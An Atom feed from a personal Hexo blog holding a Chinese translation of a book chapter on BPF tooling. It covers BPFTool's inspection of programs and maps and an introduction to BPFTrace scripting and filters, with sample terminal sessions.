<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ELSSM&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="elssm.github.io/"/>
  <updated>2022-05-29T12:17:26.336Z</updated>
  <id>elssm.github.io/</id>
  
  <author>
    <name>elssm</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>使用BPF的Linux可观测性(下篇)-翻译</title>
    <link href="elssm.github.io/2022/05/29/%E4%BD%BF%E7%94%A8BPF%E7%9A%84Linux%E5%8F%AF%E8%A7%82%E6%B5%8B%E6%80%A7-%E4%B8%8B%E7%AF%87-%E7%BF%BB%E8%AF%91/"/>
    <id>elssm.github.io/2022/05/29/使用BPF的Linux可观测性-下篇-翻译/</id>
    <published>2022-05-29T12:07:54.000Z</published>
    <updated>2022-05-29T12:17:26.336Z</updated>
    
    <content type="html"><![CDATA[<h2 id="第五章节"><a href="#第五章节" class="headerlink" title="第五章节"></a>第五章节</h2><h3 id="BPF实用程序"><a href="#BPF实用程序" class="headerlink" title="BPF实用程序"></a>BPF实用程序</h3><p>到目前为止，我们已经讨论了如何编写BPF程序以在系统中获得更多可见性。多年来，许多开发人员都使用BPF构建了用于相同目的的工具。在本章中，我们将讨论一些你可以每天使用的现成工具。其中许多工具是你已经见过的一些BPF程序的高级版本。还有一些工具可以帮助你直接了解自己的BPF程序。</p><p>本章介绍了一些工具，可以在BPF的日常工作中对你有所帮助。我们首先介绍BPFTool，这是一个命令行实用程序，用于获取有关 BPF 程序的更多信息。我们涵盖了<code>BPFTrace</code>和<code>kubectl-trace</code>，它们会让你使用简洁的领域特定语言(DSL)有效地编写BPF程序。最后，我们谈谈<code>eBPF Exporter</code>，一个将BPF与Prometheus集成的开源项目。</p><h4 id="BPFTool"><a href="#BPFTool" class="headerlink" title="BPFTool"></a>BPFTool</h4><p>BPFTool是一个用于检查BPF程序和映射的内核实用程序。默认情况下，该工具不会安装在任何Linux发行版上，而且它正在大量开发中，因此需要最能支持你的Linux内核版本。这里我们介绍<code>Linux 5.1</code>版的BPFTool。</p><p>在接下来的部分中，我们将讨论如何将BPFTool安装到你的系统上，以及如何使用它来观察和更改BPF程序的行为和终端中的映射。</p><h5 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> 获取内核源码。源码下载地址如下</span><br><span class="line">https://mirrors.edge.kernel.org/pub/linux/kernel/</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 解压</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 进入tool目录</span><br><span class="line">cd linux-x.x/tools/bpf/bpftool</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 安装bpf</span><br><span class="line">make &amp;&amp; sudo make install</span><br></pre></td></tr></table></figure><p>可以通过检查其版本来检查BPFTool是否已正确安装：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos ~]# bpftool --version</span><br><span class="line">bpftool v5.17.0</span><br><span class="line">features: libbpf_strict</span><br></pre></td></tr></table></figure><h5 id="功能展示"><a href="#功能展示" class="headerlink" title="功能展示"></a>功能展示</h5><p>你可以使用BPFTool执行的基本操作之一是扫描系统以了解可以访问哪些BPF功能。 当你不记得哪个版本的内核引入了哪种程序或是否启用了<code>BPF JIT</code>编译器时，这种方法非常有用。要找出这些问题以及许多其他问题的答案，请运行以下命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos ~]# bpftool feature </span><br><span class="line">Scanning system configuration...</span><br><span class="line">bpf() syscall for unprivileged users is enabled</span><br><span class="line">JIT compiler is enabled</span><br><span class="line">JIT compiler hardening is disabled</span><br><span class="line">JIT compiler kallsyms exports are enabled for root</span><br><span class="line">...</span><br><span class="line">Scanning system call availability...</span><br><span class="line">bpf() syscall is available</span><br><span class="line">Scanning eBPF program types...</span><br><span class="line">eBPF program_type socket_filter is available</span><br><span class="line">eBPF program_type kprobe is available</span><br><span class="line">...</span><br><span class="line">Scanning eBPF map types...</span><br><span class="line">eBPF map_type hash is available</span><br><span class="line">eBPF map_type array is available</span><br><span class="line">eBPF map_type prog_array is available</span><br><span class="line">eBPF map_type perf_event_array is availab</span><br></pre></td></tr></table></figure><p>在此输出中可以看到我们的系统允许非特权用户执行<code>syscall bpf</code>，此调用仅限于某些操作。 还可以看到JIT已启用。较新版本的内核默认启用此JIT，它对编译BPF程序有很大帮助。 如果你的系统没有启用它，您可以运行以下命令来启用它：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> echo 1 &gt; /proc/sys/net/core/bpf_jit_enable</span><br></pre></td></tr></table></figure><p>功能输出还显示了系统中启用了哪些程序类型和映射类型。这个命令提供的信息比我们在这里展示的要多得多，比如程序类型和许多其他配置指令支持的BPF助手。</p><h5 id="检查BPF程序"><a href="#检查BPF程序" class="headerlink" title="检查BPF程序"></a>检查BPF程序</h5><p>BPFTool为你提供有关内核上BPF程序的直接信息。它允许调查系统中已经运行的内容。还允许加载和固定以前从命令行编译的新的BPF程序。</p><p>学习如何使用BPFTool处理程序的最佳起点是检查你在系统中运行的内容。为此，可以运行命令<code>bpftool prog show</code>。 如果你使用<code>Systemd</code>作为你的init系统，那么可能已经加载了一些BPF程序并附加到一些cgroup；我们稍后再讨论这些。 运行该命令的输出将如下所示：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos ~]# bpftool prog show</span><br><span class="line">52: cgroup_skb  tag 7be49e3934a125ba</span><br><span class="line">       loaded_at 2019-03-28T16:46:04-0700  uid 0</span><br><span class="line">       xlated 296B  jited 229B  memlock 4096B  map_ids 52,53</span><br><span class="line">53: cgroup_skb  tag 2a142ef67aaad174</span><br><span class="line">       loaded_at 2019-03-28T16:46:04-0700  uid 0</span><br><span class="line">       xlated 296B  jited 229B  memlock 4096B  map_ids 52,53</span><br><span class="line">54: cgroup_skb  tag 7be49e3934a125ba</span><br><span class="line">       loaded_at 2019-03-28T16:46:04-0700  uid 0</span><br><span class="line">       xlated 296B  jited 229B  memlock 4096B  map_ids 54,55</span><br></pre></td></tr></table></figure><p>左侧冒号前的数字是程序标识符；我们稍后会使用它们来调查这些程序的全部内容。从这个输出中还可以了解系统正在运行哪些类型的程序。在当前这种情况下，系统正在运行三个附加到cgroup套接字缓冲区的BPF程序。如果这些程序实际上是由<code>Systemd</code>启动的，则加载时间可能会与你启动系统时匹配。你还可以查看这些程序当前使用了多少内存以及与它们关联的映射的标识符。 所有这些乍一看都很有用，而且因为我们有程序标识符，我们可以更深入地进行研究。</p><p>你可以将程序标识符作为额外参数添加到前面的命令中：<code>bpftool prog show id 52</code>。这样，BPFTool将显示你之前看到的相同信息，但仅针对由ID 52标识的程序； 这样可以过滤掉你不需要的信息。 此命令还支持<code>--json</code>标志来生成一些JSON输出。如果你想操作输出，这个JSON输出非常方便。例如，像<code>jq</code>这样的工具会为你提供更结构化的数据格式：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> bpftool prog show --json id 52 | jq</span><br><span class="line"> &#123;</span><br><span class="line">  "id": 52,</span><br><span class="line">  "type": "cgroup_skb",</span><br><span class="line">  "tag": "7be49e3934a125ba",</span><br><span class="line">  "gpl_compatible": false,</span><br><span class="line">  "loaded_at": 1553816764,</span><br><span class="line">  "uid": 0,</span><br><span class="line">  "bytes_xlated": 296,</span><br><span class="line">  "jited": true,</span><br><span class="line">  "bytes_jited": 229,</span><br><span class="line">  "bytes_memlock": 4096,</span><br><span class="line">  "map_ids": [</span><br><span class="line">  52,</span><br><span class="line">  53</span><br><span class="line">  ] </span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>当你知道程序标识符时，你还可以使用BPFTool获取整个程序的转储；当你需要调试编译器生成的BPF字节码时，这会很方便：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> bpftool prog dump xlated id 52</span><br><span class="line">       0: (bf) r6 = r1</span><br><span class="line">       1: (69) r7 = *(u16 *)(r6 +192)</span><br><span class="line">       2: (b4) w8 = 0</span><br><span class="line">       3: (55) if r7 != 0x8 goto pc+14</span><br><span class="line">       4: (bf) r1 = r6</span><br><span class="line">       5: (b4) w2 = 16</span><br><span class="line">       6: (bf) r3 = r10</span><br><span class="line">       7: (07) r3 += -4</span><br><span class="line">       8: (b4) w4 = 4</span><br><span class="line">       9: (85) call bpf_skb_load_bytes#7151872</span><br><span class="line">       ...</span><br></pre></td></tr></table></figure><p>这个由<code>Systemd</code>加载到我们内核中的程序正在使用帮助程序<code>bpf_skb_load_bytes</code>检查数据包数据。</p><p>如果你想要这个程序更直观的表示，包括指令跳转，你可以在这个命令中使用<code>visual</code>关键字。 这将生成一种格式化的输出，你可以使用<code>dot</code>之类的工具或任何其他可以绘制图形的程序将其转换为图形表示：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> bpftool prog dump xlated id 52 visual &amp;&gt; output.out</span><br><span class="line"><span class="meta">#</span> dot -Tpng output.out -o visual-graph.png</span><br></pre></td></tr></table></figure><p>如果你运行的是<code>5.1</code>或更新版本的内核，还可以访问运行时统计信息。它们告诉你内核在你的BPF程序上花费了多长时间。默认情况下，系统中可能未启用此功能；你需要先运行这个命令，让内核知道它需要向你展示这些数据：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> sysctl -w kernel.bpf_stats_enabled=1</span><br></pre></td></tr></table></figure><p>启用统计信息后，你将在运行BPFTool时获得另外两条信息：内核运行该程序所花费的总时间<code>(run_time_ns)</code>，以及运行该程序的次数<code>(run_cnt)</code>：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">52: cgroup_skb  tag 7be49e3934a125ba  run_time_ns 14397 run_cnt 39</span><br><span class="line">     loaded_at 2019-03-28T16:46:04-0700  uid 0</span><br><span class="line">     xlated 296B  jited 229B  memlock 4096B  map_ids 52,53</span><br></pre></td></tr></table></figure><p>但是BPFTool不仅允许你检查程序的运行情况；它还允许你将新程序加载到内核中并将其中一些附加到套接字和 <code>cgroup</code>。 例如，我们可以加载我们以前的程序之一并将其固定到BPF文件系统，使用以下命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt1]# bpftool prog load bpf_program.o /sys/fs/bpf/bpf_prog</span><br><span class="line">[root@VM-16-14-centos cpt1]# bpftool prog show</span><br><span class="line">254: tracepoint  name bpf_prog  tag c6e8e35bea53af79  gpl</span><br><span class="line">loaded_at 2022-05-28T17:06:14+0800  uid 0</span><br><span class="line">xlated 112B  jited 76B  memlock 4096B  map_ids 43</span><br></pre></td></tr></table></figure><h5 id="检查BPF映射"><a href="#检查BPF映射" class="headerlink" title="检查BPF映射"></a>检查BPF映射</h5><p>除了允许检查和操作BPF程序之外，BPFTool还可以让您访问这些程序正在使用的BPF映射。 列出所有映射并按其标识符过滤映射的命令，类似之前看到的show命令。 除了让BPFTool显示prog的信息，还可以显示map的信息：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> bpftool map show</span><br><span class="line">    52: lpm_trie  flags 0x1</span><br><span class="line">            key 8B  value 8B  max_entries 1  memlock 4096B</span><br><span class="line">    53: lpm_trie  flags 0x1</span><br><span class="line">            key 20B  value 8B  max_entries 1  memlock 4096B</span><br><span class="line">    54: lpm_trie  flags 0x1</span><br><span class="line">            key 8B  value 8B  max_entries 1  memlock 4096B</span><br><span class="line">    55: lpm_trie  flags 0x1</span><br><span class="line">            key 20B  value 8B  max_entries 1  memlock 4096B</span><br></pre></td></tr></table></figure><p>这些映射与之前看到的附加到程序的标识符相匹配。还可以按ID过滤映射。</p><p>你可以使用BPFTool创建和更新映射并列出映射中的所有元素。创建新映射所需的信息与你在初始化映射时提供的信息相同。我们需要指定要创建的映射类型、键和值的大小及其名称。因为我们没有将映射与程序一起初始化，所以我们还需要将它固定到BPF文件系统，以便我们以后可以使用它：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos bpf]# bpftool map create /sys/fs/bpf/counter type array key 4 value 4 entries 5 name counter</span><br></pre></td></tr></table></figure><p>如果在运行该命令后列出系统中的映射，将在列表底部看到新映射：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos bpf]# bpftool map</span><br><span class="line">1: array  flags 0x0</span><br><span class="line">key 4B  value 4B  max_entries 100  memlock 4096B</span><br><span class="line">45: array  name counter  flags 0x0</span><br><span class="line">key 4B  value 4B  max_entries 5  memlock 4096B</span><br></pre></td></tr></table></figure><p>创建映射后可以像在BPF程序中那样更新和删除元素。</p><p>如果要向映射添加新元素或更新现有元素，可以使用映射更新命令。你可以从前面的示例中获取映射标识符：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos bpf]# bpftool map update id 45 key 1 0 0 0 value 1 0 0 0</span><br></pre></td></tr></table></figure><p>如果你尝试使用无效的键或值更新元素，BPFTool将返回错误：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos bpf]# bpftool map update id 45 key 1 0 0 0 value 1 0 0</span><br><span class="line">Error: value expected 4 bytes got 3</span><br></pre></td></tr></table></figure><p>如果需要检查其值，BPFTool可以提供映射中所有元素的转储。在创建固定大小的数组映射时，可以看到BPF如何将所有元素初始化为空值：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos bpf]# bpftool map dump id 45</span><br><span class="line">key: 00 00 00 00  value: 00 00 00 00</span><br><span class="line">key: 01 00 00 00  value: 01 00 00 00</span><br><span class="line">key: 02 00 00 00  value: 00 00 00 00</span><br><span class="line">key: 03 00 00 00  value: 00 00 00 00</span><br><span class="line">key: 04 00 00 00  value: 00 00 00 00</span><br><span class="line">Found 5 elements</span><br></pre></td></tr></table></figure><p>BPFTool提供的最强大的选项之一是，你可以将预先创建的映射附加到新程序，并用这些预先分配的映射替换它们初始化的映射。这样你可以从一开始就让程序访问保存的数据，即使你没有编写程序来从BPF文件系统读取映射。 为此，你需要在使用BPFTool加载程序时设置要初始化的映射。可以通过程序加载它时的有序标识符来指定映射，例如，0表示第一个映射，1表示第二个映射，依此类推。还可以通过名称指定映射，这通常更方便：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt1]# bpftool prog load bpf_program.o /sys/fs/bpf/bpf_prog_2         map name counter pinned /sys/fs/bpf/counter</span><br></pre></td></tr></table></figure><p>在这个例子中，我们将刚刚创建的映射附加到一个新程序中。在这种情况下，我们将映射替换为它的名称，因为我们知道程序初始化了一个名为counter的映射。 你还可以使用关键字<code>idx</code>使用映射的索引位置，如<code>idx 0</code>。</p><p>当您需要实时调试消息传递时，直接从命令行访问BPF映射很有用。 BPFTool让你以一种更方便的方式直接访问。 除了自省程序和映射之外，你还可以使用BPFTool从内核中提取更多信息。 接下来让我们看看如何访问特定的接口。</p><h5 id="检查附着到特定接口的程序"><a href="#检查附着到特定接口的程序" class="headerlink" title="检查附着到特定接口的程序"></a>检查附着到特定接口的程序</h5><p>有时你会发现自己想知道哪些程序附加到特定接口。BPF 可以加载在<code>cgroup</code>、<code>Perf</code>事件和网络数据包之上工作的程序。子命令<code>cgroup、perf 和 net</code>可以帮助你追溯这些接口上的附着程序。</p><p><code>perf</code>子命令列出所有附加到系统中跟踪点的程序，如<code>kprobes、uprobes和tracepoints</code>； 你可以通过运行 <code>bpftool perf show</code>来查看该列表。</p><p><code>net</code>子命令列出了附加到XDP和Traffic Control的程序。其他附着程序，如套接字过滤器和重用端口程序，只能通过使用<code>iproute2</code>访问。 您可以使用<code>bpftool net show</code>列出XDP和TC的附着程序，就像在其他BPF对象中看到的一样。</p><p>最后，<code>cgroup</code>子命令列出所有附加到<code>cgroup</code>的程序。 这个子命令与你看到的其他命令有些不同。<code>bpftool cgroup show</code>需要你检查的<code>cgroup</code>路径。如果要列出系统中所有<code>cgroup</code>中的所有附着程序，则需要使用<code>bpftool cgroup tree</code>，如下例所示：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> bpftool cgroup tree</span><br><span class="line">    CgroupPath</span><br><span class="line">    ID       AttachType      AttachFlags     Name</span><br><span class="line">    /sys/fs/cgroup/unified/system.slice/systemd-udevd.service</span><br><span class="line">5 ingress</span><br><span class="line">        4        egress</span><br><span class="line">    /sys/fs/cgroup/unified/system.slice/systemd-journald.service</span><br><span class="line">3 ingress</span><br><span class="line">        2        egress</span><br><span class="line">    /sys/fs/cgroup/unified/system.slice/systemd-logind.service</span><br><span class="line">        7        ingress</span><br><span class="line">        6        egress</span><br></pre></td></tr></table></figure><p>至此，我们已经讨论了如何在终端中输入不同的命令来调试BPF程序。但是，当你最需要这些命令时，记住所有这些命令可能会很麻烦。接下来，我们将描述如何从纯文本文件加载几个命令，以便你可以构建一组方便使用的脚本。</p><h5 id="在批处理模式下加载命令"><a href="#在批处理模式下加载命令" class="headerlink" title="在批处理模式下加载命令"></a>在批处理模式下加载命令</h5><p>当你尝试分析一个或多个系统的行为时，经常反复运行多个命令。最终可能会得到一组经常在工具链中使用的命令。 如果你不想每次都输入这些命令，BPFTool的批处理模式就很适合你。</p><p>使用批处理模式可以将要执行的所有命令写入文件并一次运行所有命令。还可以通过以<code>#</code>开头的行在此文件中写入注释。但是，这种执行模式不是原子的。BPFTool逐行执行命令，如果其中一个命令失败，它将中止执行，使系统处于运行最新成功命令后的状态。</p><p>以下是批处理模式可以处理的文件的简短示例：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> Create a new hash map</span><br><span class="line">map create /sys/fs/bpf/hash_map type hash key 4 value 4 entries 5 name hash_map</span><br><span class="line"><span class="meta">#</span> Now show all the maps in the system</span><br><span class="line">map show</span><br></pre></td></tr></table></figure><p>如果将这些命令保存在名为<code>/tmp/batch_example.txt</code>的文件中，则可以使用<code>bpftool batch file /tmp/batch_example.txt</code>加载它。 当你第一次运行这个命令时，你会得到类似于下面的代码片段的输出，但是如果你再次尝试运行它，这个命令将会退出并且没有输出，因为我们已经有一个名为<code>hash_map</code>的映射在系统，并且批处理执行将在第一行失败：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos tmp]# bpftool batch file /tmp/batch_example.txt</span><br><span class="line">46: array  name counter  flags 0x0</span><br><span class="line">key 4B  value 4B  max_entries 5  memlock 4096B</span><br><span class="line">51: hash  name hash_map  flags 0x0</span><br><span class="line">key 4B  value 4B  max_entries 5  memlock 4096B</span><br><span class="line">processed 2 commands</span><br></pre></td></tr></table></figure><h5 id="显示BTF信息"><a href="#显示BTF信息" class="headerlink" title="显示BTF信息"></a>显示BTF信息</h5><p>BPFTool可以显示任何给定二进制对象存在的BPF类型格式(BTF)信息。BTF使用元数据信息对程序结构进行注释，以帮助你调试程序。</p><p>例如，当你将关键字<code>linum</code>添加到<code>prog dump</code>时，它可以为你提供BPF程序中每条指令的源文件和行号。</p><p>BPFTool的最新版本包括一个新的<code>btf</code>子命令，帮助你深入了解程序。此命令的初始重点是可视化结构类型。例如，<code>bpftool btf dump id 54</code>显示了ID为54的程序的所有BTF类型。</p><h4 id="BPFTrace"><a href="#BPFTrace" class="headerlink" title="BPFTrace"></a>BPFTrace</h4><p>BPFTrace是BPF的高级跟踪语言。允许你使用简洁的DSL编写BPF程序，并将它们保存为可以执行的脚本，而无需手动编译和加载它们到内核中。该语言受到其他知名工具的启发，例如<code>awk</code>和<code>DTrace</code>。</p><p>与直接使用BCC或其他BPF工具编写程序相比，使用BPFTrace的优势之一是BPFTrace提供了许多你不需要自己实现的内置功能，例如聚合信息和创建直方图。</p><p>以Centos8为例，如果你安装了<code>epel-release</code>支持，那么一条dnf就可以安装bpftrace</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos ~]# dnf install bpftrace</span><br></pre></td></tr></table></figure><p>BPFTrace执行的程序具有简洁的语法。我们可以将它们分为三个部分：<code>header, action blocks, and footer</code>。 <code>header</code>是BPFTrace在加载程序时执行的特殊块；它通常用于在输出顶部打印一些信息，例如序言。同样，<code>footer</code>是一个特殊的块，BPFTrace在终止程序之前执行一次。 <code>header</code>和<code>footer</code>都是BPFTrace程序中的可选部分。一个 BPFTrace程序必须至少有一个<code>action block</code>。<code>action block</code>是我们指定要跟踪的探针以及内核触发这些探针的事件时执行的操作的地方。下一个示例我们将展示这三个部分：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">BEGIN</span><br><span class="line">    &#123;</span><br><span class="line">      printf("starting BPFTrace program\n")</span><br><span class="line">&#125;</span><br><span class="line">kprobe:do_sys_open</span><br><span class="line">    &#123;</span><br><span class="line">      printf("opening file descriptor: %s\n", str(arg1))</span><br><span class="line">&#125;</span><br><span class="line">END</span><br><span class="line">    &#123;</span><br><span class="line">      printf("exiting BPFTrace program\n")</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>header</code>部分总是用关键字BEGIN标记，而<code>footer</code>部分总是用关键字END标记。 这些关键字由BPFTrace保留。 <code>action block</code>标识符定义了你希望将BPF操作附加到的探测器。在前面的示例中，我们在内核每次打开文件时打印一行日志。</p><p>除了识别程序部分之外，我们已经可以在前面的示例中看到有关语言语法的更多细节。BPFTrace提供了一些帮助程序，这些帮助程序在程序编译时被翻译成BPF代码。 帮助程序<code>printf</code>是C函数<code>printf</code>的包装器，它在你需要时打印程序详细信息。str是一个内置的辅助函数，它将C指针转换为其字符串表示形式。许多内核函数接收指向字符的指针作为参数。这个辅助函数会为你翻译那些指向字符串的指针。</p><p>BPFTrace可以被认为是一种动态语言，因为它不知道内核执行探针时可能收到的参数数量。这就是BPFTrace提供参数辅助函数来访问内核处理的信息的原因。BPFTrace根据块接收的参数数量动态生成这些帮助程序，可以通过其在参数列表中的位置访问信息。在前面的示例中，<code>arg1</code>是对open系统调用中第二个参数的引用，它引用了文件路径。</p><p>要执行此示例，可以将其保存在文件中并使用文件路径作为第一个参数运行BPFTrace：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos ~]# bpftrace /tmp/example.bt</span><br></pre></td></tr></table></figure><p>BPFTrace语言在设计时考虑了脚本。在前面的示例中，您已经看到了该语言的简洁版本。 但是，你也可以无需将这些单行程序存储在文件中即可执行它们；可以在执行BPFTrace时使用选项<code>-e</code>运行它们。 如下所示</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos ~]# bpftrace -e "kprobe:do_sys_open &#123; @opens[arg1] = count() &#125;"</span><br><span class="line">Attaching 1 probe...</span><br><span class="line">@opens[94865239214048]: 1</span><br><span class="line">@opens[140736438418016]: 1</span><br><span class="line">@opens[140297599132240]: 1</span><br><span class="line">@opens[93945902307104]: 1</span><br><span class="line">@opens[94865239225648]: 1</span><br><span class="line">@opens[94865239215744]: 1</span><br><span class="line">@opens[93945902306496]: 1</span><br><span class="line">@opens[139870543823312]: 1</span><br><span class="line">@opens[139870563935520]: 1</span><br><span class="line">@opens[140267846679600]: 1</span><br><span class="line">@opens[139870563971376]: 1</span><br><span class="line">@opens[94774158865584]: 1</span><br><span class="line">@opens[140449669998819]: 1</span><br><span class="line">@opens[93945902302160]: 1</span><br><span class="line">@opens[93945902300160]: 1</span><br><span class="line">@opens[93907893935248]: 1</span><br></pre></td></tr></table></figure><h5 id="过滤"><a href="#过滤" class="headerlink" title="过滤"></a>过滤</h5><p>当你运行前面的例子时，你可能会得到一个系统不断打开的文件流，直到你按下<code>Ctrl-C</code>退出程序。 那是因为我们告诉BPF打印内核打开的每个文件描述符。在某些情况下，你只想针对特定条件执行<code>action block</code>。 BPFTrace称之为过滤。</p><p>你可以将一个过滤器关联到每个<code>action block</code>。 它们像<code>action block</code>一样评估，但如果过滤器返回false值，则操作不会执行。他们还可以访问该语言的其余部分，包括探测参数和辅助函数。 这些过滤器封装在动作标头之后的两个斜杠中：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kprobe:do_sys_open /str(arg1) == "/tmp/example.bt"/</span><br><span class="line">    &#123;</span><br><span class="line">      printf("opening file descriptor: %s\n", str(arg1))</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>在这个例子中，我们将我们的动作块优化为仅当内核打开的文件是我们用来存储这个例子的文件时才执行。如果你用新的过滤器运行程序，你会看到它打印了标题，但它在那里停止打印。 这是因为由于我们的新过滤器，之前触发我们操作的每个文件现在都被跳过了。如果你在不同的终端中多次打开示例文件，你将看到当过滤器匹配我们的文件路径时内核如何执行操作：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos ~]# bpftrace /tmp/example.bt</span><br><span class="line">    Attaching 3 probes...</span><br><span class="line">    starting BPFTrace program</span><br><span class="line">    opening file descriptor: /tmp/example.bt</span><br><span class="line">    opening file descriptor: 